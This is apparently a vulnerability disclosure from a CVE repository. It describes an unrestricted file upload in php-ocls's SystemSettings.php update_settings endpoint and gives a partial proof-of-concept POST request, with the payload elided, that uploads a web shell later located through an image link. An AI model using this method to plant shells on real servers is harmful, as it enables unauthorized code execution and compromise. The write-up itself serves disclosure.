...
route:/php-ocls/classes/SystemSettings.php

code analysis
Here, the file is uploaded without determining the suffix of the uploaded file.
![image](https://github.com/jxm68868/cve/assets/112402021/c518cea3-140c-44be-b117-0131278b5bbf)

POC
```
POST /php-ocls/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: localhost
...
Content-Type: multipart/form-data; boundary=---------------------------7324488038716522121590340710
Content-Length: 6470
Origin: http://localhost
Connection: close
Referer: http://localhost/php-ocls/admin/?page=system_info
...
-----------------------------7324488038716522121590340710--
```
![image](https://github.com/jxm68868/cve/assets/112402021/de99f550-fde0-4adf-84e1-15903ffcdcc6)

Copy the image link to find the uploaded shell file
![image](https://github.com/jxm68868/cve/assets/112402021/767af061-51f9-4e53-ad3b-83bf9ecaa2c3)
![image](https://github.com/jxm68868/cve/assets/112402021/561f203a-4523-403d-aaf9-4930a46c3afe)
